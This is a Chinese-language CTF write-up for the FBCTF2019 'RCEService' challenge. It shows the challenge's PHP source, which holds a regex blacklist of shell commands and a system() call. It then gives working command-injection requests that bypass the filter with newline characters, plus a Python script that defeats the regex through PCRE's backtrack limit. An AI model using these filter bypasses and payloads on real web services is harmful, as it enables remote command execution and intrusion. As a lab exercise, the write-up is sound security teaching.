# [FBCTF2019]RCEService

[题目地址](https://buuoj.cn/challenges#[FBCTF2019]RCEService)

进网站看了看，命令要用这种方式输入：

- {"cmd":"ls"}

但是过滤了好多东西，/过滤了，.过滤了，基本能过滤的都过滤了。这怎么玩，看了[wp](https://blog.csdn.net/mochu7777777/article/details/105151353)才知道有源码没给出。

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

真的是过滤得不剩什么了，但是有个问题，使用的preg_match无法匹配多行，^和$符号也无济于事，加个%0a换行符就绕过了。于是我们正常执行命令，只需要在命令头和尾加上%0a就能绕过了。

- http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/?cmd={%0A%22cmd%22:%20%22ls%20/%22%0A}
    > bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

结果这次flag不在根目录下。[find](https://www.runoob.com/linux/linux-comm-find.html)命令找一找flag到底在哪里。

- http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/?cmd={%0A%22cmd%22:%20%22/usr/bin/find%20/%20-name%20flag%22%0A}
    > /home/rceservice/flag

注意要用绝对路径/usr/bin/find。cat完事。

- http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/?cmd={%0A%22cmd%22:%20%22/bin/cat%20/home/rceservice/flag%22%0A}
  > flag{a943a48b-b857-4021-a1f7-756b3bf6b600}

这题预期解是利用[pcre回溯](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)的问题。php的PCRE库使用了[NFA](https://zh.m.wikipedia.org/zh-cn/%E9%9D%9E%E7%A1%AE%E5%AE%9A%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E8%87%AA%E5%8A%A8%E6%9C%BA)作为正则引擎，NFA的运行方式如下。

假设要匹配的正则是<\?.\*[(`;?>].\*，输入是`<?php phpinfo();//aaaaa`。NFA一点一点读正则表达式。

**<**\?.\*[(`;?>].\*<Br>
**<**?php phpinfo();//aaaaa

正则的<匹配了输入的<。当前匹配成功则读取下一个字符。

**<\?**.\*[(`;?>].\*<br>
**<\?** php phpinfo();//aaaaa

?也匹配成功，继续。

**<\?.\***[(`;?>].\*<br>
**<\? php phpinfo();//aaaaa**

`.*`会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。

**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaaaa** ？

发现输入已经没东西匹配了。此时NFA开始回溯，回退之前匹配的字符。

**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaaa**a ？

回退出来的字符a仍然无法匹配[(`;?>]。继续回溯。

**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();//aaa**aa ？

还是不行。回溯这一步骤会重复执行，直到回溯到下面的状态。

**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo()**;//aaaaa ？

这一步回溯回退出来的字符是`;`，匹配正则表达式[(`;?>]。便停止回溯，匹配上字符。

**<\?.\*[(`;?>]**.\*<br>
**<\? php phpinfo();**//aaaaa

最后的一个正则表达式匹配完接下来的所有内容。

**<\?.\*[(`;?>].\***<br>
**<\? php phpinfo();//aaaaa**

完全匹配成功，返回true。如果我们数一下，会发现回溯次数为8，而回溯次数是有上限的，默认是100万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回f
alse。此false非彼False，`var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);`返回的结果是bool(true)。但这个false可以被强制转换，下面的waf：

```php
if(preg_match('/UNION.+?SELECT/is', $input)) {
    die('SQL Injection');
}
```

就可以利用pcre的回溯次数限制绕过。但是下面的waf：

```php
function is_php($data){  
    return preg_match('/<\?.*[(`;?>].*/is', $data);  
}

if(is_php($input) === 0) {
    // fwrite($f, $input); ...
}
```

就不可以。使用了===强等于，PREG_BACKTRACK_LIMIT_ERROR不等于0。利用这一特点，我们可以在payload末尾加一堆a，使其超过回溯限制。

```python
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
res = requests.post("http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/", data={"cmd":payload})
#print(payload)
print(res.text)
```

## Flag
> flag{a943a48b-b857-4021-a1f7-756b3bf6b600}